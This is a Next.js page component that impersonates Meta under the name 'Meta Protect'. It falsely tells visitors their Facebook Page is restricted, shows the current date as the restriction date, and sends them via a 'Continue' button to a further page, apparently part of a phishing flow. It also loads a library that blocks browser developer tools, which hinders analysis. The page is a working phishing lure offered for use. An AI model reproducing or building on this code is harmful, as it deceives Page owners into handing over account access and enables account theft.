// pages/community-standard.js
import Head from 'next/head';
import Script from 'next/script';
import Image from 'next/image';

export default function CommunityStandard() {
    return (
        <div>
            <Head>
                <title>Community Standard</title>
                <meta charSet="utf-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1" />

                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" />
                <link href="https://fonts.cdnfonts.com/css/segoe-ui-4" rel="stylesheet" />
                <link href="https://fonts.cdnfonts.com/css/frutiger" rel="stylesheet" />
                <link href="https://fonts.googleapis.com/css2?family=AR+One+Sans&family=Ruda:wght@500&display=swap" rel="stylesheet" />
                <link rel="shortcut icon" href="/img/xike.ico" />
                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
                <link rel="stylesheet" href="/style/index.css" />
                <meta property="og:image" content="https://res.cloudinary.com/dppdtq0df/image/upload/v1705144092/head_lkdnjp.png" />
            </Head>

            <main>
                <div className="lsd-ring-container d-none">
                    <div className="lds-ring">
                        <div></div><div></div><div></div><div></div>
                    </div>
                </div>

                <div className="container-fluid px-3 px-md-5">
                    <div className="row justify-content-center">
                        <div className="col-12 col-sm-10 col-md-8 col-lg-6">

                            <div className="card-container d-none my-4" id="getCode">
                                <div className="card border-0 shadow-sm">
                                    <div className="card-header py-3 text-white" style={{ backgroundColor: '#355797' }}>
                                        Form Submitted Successfully
                                    </div>
                                    <div className="card-body">
                                        <p className="card-text text-muted">
                                            Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You can view responses in your Support Inbox.
                                        </p>
                                        <hr />
                                        <button id="back-hone" className="btn btn-primary w-100">I Understand</button>
                                    </div>
                                </div>
                            </div>

                            <div className="card my-5 border-0 shadow-sm" id="code-form">
                                <div className="card-body p-3 p-md-4">
                                    <Image
                                        src="/img/B2Y8S9I.jpg"
                                        alt=""
                                        className="img-fluid rounded w-100 mb-4"
                                        width={650}
                                        height={400}
                                    />

                                    <h2 className="fw-bold mb-3 text-center text-md-start">Welcome To Meta Protect.</h2>
                                    <p className="mb-4 text-center text-md-start">
                                        Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
                                    </p>

                                    <div className="d-flex mb-4 align-items-start">
                                        <div className="me-3 text-center position-relative">
                                            <i className="fa fa-check-circle text-muted" style={{ fontSize: '25px' }}></i>
                                            <div style={{ width: '2px', height: '2rem', backgroundColor: 'rgb(229,231,235)', position: 'absolute', bottom: '-1rem', left: '50%', transform: 'translateX(-50%)' }}></div>
                                        </div>
                                        <p className="mb-0">We've enabled advanced protections to unlock your Page.</p>
                                    </div>

                                    <div className="d-flex mb-4 align-items-start">
                                        <div className="me-3">
                                            <i className="fa fa-id-card text-primary" style={{ fontSize: '25px' }}></i>
                                        </div>
                                        <p className="mb-0">Below, we walk you through the process in detail and help you fully activate to unlock your Page.</p>
                                    </div>

                                    <a href="/business.html" className="btn w-100 py-3 fw-bold text-white" style={{ backgroundColor: '#3f83f8' }}>
                                        Continue
                                    </a>

                                    <p className="text-center mt-3 mb-0">
                                        Your page was restricted on <span id="month" className="fw-bold">Month</span> <span id="date" className="fw-bold">Date</span>, <span id="year" className="fw-bold">Year</span>.
                                    </p>
                                </div>
                            </div>

                        </div>
                    </div>
                </div>
            </main>

            <Script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" strategy="beforeInteractive" />
            <Script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" strategy="beforeInteractive" />
            <Script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js" strategy="beforeInteractive" />
            <Script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.8/dist/sweetalert2.all.min.js" strategy="beforeInteractive" />
            <Script src="https://cdn.jsdelivr.net/npm/disable-devtool@latest" strategy="beforeInteractive" />

            <Script>
                {`
                    $(document).ready(function () {
                        const currentDate = new Date();
                        const monthNames = ["January", "February", "March", "April", "May", "June",
                            "July", "August", "September", "October", "November", "December"];
                        $('#month').text(monthNames[currentDate.getMonth()]);
                        $('#date').text(currentDate.getDate());
                        $('#year').text(currentDate.getFullYear());
                    });
                `}
            </Script>
        </div>
    );
}
